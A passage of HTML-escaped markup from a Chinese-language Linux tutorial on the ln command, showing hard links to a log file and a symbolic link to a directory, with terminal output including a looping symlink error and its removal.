&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-43&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-45&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-47&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-49&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-51&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0062 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;在test3目录中创建了log2013.log的硬链接，修改test3目录中的log2013.log文件，同时也会同步到源文件&lt;/p&gt;
&lt;p&gt;实例5：给目录创建软链接&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f39357717896328&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
ln -sv /opt/soft/test/test3 /opt/soft/test/test5&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39357717896328-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39357717896328-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sv&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0008 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f3935a645316559&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# ll

drwxr-xr-x 2 root root   4096 12-07 16:36 test3

drwxr-xr-x 2 root root   4096 12-07 16:57 test5

[root@localhost test]# cd test5

[root@localhost test5]# ll

lrwxrwxrwx 1 root root 5 12-07 16:57 test3 -&amp;gt; test3

[root@localhost test5]# cd test3

-bash: cd: test3: 符号连接的层数过多

[root@localhost test5]# 

[root@localhost test5]# 

[root@localhost test5]# ll

lrwxrwxrwx 1 root root 5 12-07 16:57 test3 -&amp;gt; test3

[root@localhost test5]# rm -rf test3

[root@localhost test5]# ll

[root@localhost test5]# ln -sv /opt/soft/test/test3 /opt/soft/test/test5

创建指向“/opt/soft/test/test3”的符号链接“/opt/soft/test/test5/test3”

[root@localhost test5]# ll

lrwxrwxrwx 1 root root 20 12-07 16:59 test3 -&amp;gt; /opt/soft/test/test3

[root@localhost test5]# 

[root@localhost test5]# cd test3

[root@localhost test3]# ll

总计 4

-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log

[root@localhost test3]# touch log2014.log

[root@localhost test3]# ll

总计 4

-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log

-rw-r--r-- 1 root root  0 12-07 17:05 log2014.log

[root@localhost test3]# cd ..

[root@localhost test5]# cd ..&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3935a645316559-59&quot;&gt;59&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-3&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;crayon-e&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-5&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;57&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;test5&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-7&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd test5&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-9&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-11&quot;&gt;
